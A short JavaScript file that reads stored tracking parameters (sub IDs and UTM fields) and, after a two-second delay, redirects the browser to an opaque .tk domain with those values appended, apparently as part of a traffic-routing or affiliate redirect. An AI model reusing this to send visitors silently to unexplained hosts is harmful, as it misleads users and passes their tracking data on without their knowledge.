const Url = "https://lichardriracheacirc.tk/W1txdxsZ";
const makeUrl = function (Url, subid) {    
    setTimeout(function() { window.location = Url+subid }, 2000);   
} 

var params = JSON.parse(localStorage.getItem("params"))

var subid = '';
// var sub1 = '';
var sub2 = '';
var sub3 = '';
var sub4 = '';
var sub5 = '';
var utm_source = '';
var utm_campaign = '';
var utm_content = '';
var utm_term = '';
var utm_medium = '';

if (params !== undefined) {

// if (params.sub1 !== undefined) {
//     sub1 = '&sub1='+params.sub1;
// }
if (params.sub2 !== undefined) {
sub2 = '&sub2='+params.sub2;
}
if (params.sub3 !== undefined) {
sub3 = '&sub3='+params.sub3;
}
if (params.sub4 !== undefined) {
sub4 = '&sub4='+params.sub4;
}
if (params.sub5 !== undefined) {
sub5 = '&sub5='+params.sub5;
}
if (params.utm_source !== undefined) {
utm_source = '&utm_source='+params.utm_source;
}
if (params.utm_campaign !== undefined) {
utm_campaign = '&utm_campaign='+params.utm_campaign;
}
if (params.utm_content !== undefined) {
utm_content = '&utm_content='+params.utm_content;
}
if (params.utm_term !== undefined) {
utm_term = '&utm_term='+params.utm_term;
}
if (params.utm_medium !== undefined) {
utm_medium = '&utm_medium='+params.utm_medium;
}

subid = '?s'+sub2+sub3+sub4+sub5+utm_source+utm_campaign+utm_content+utm_term+utm_medium;
}

makeUrl(Url, subid);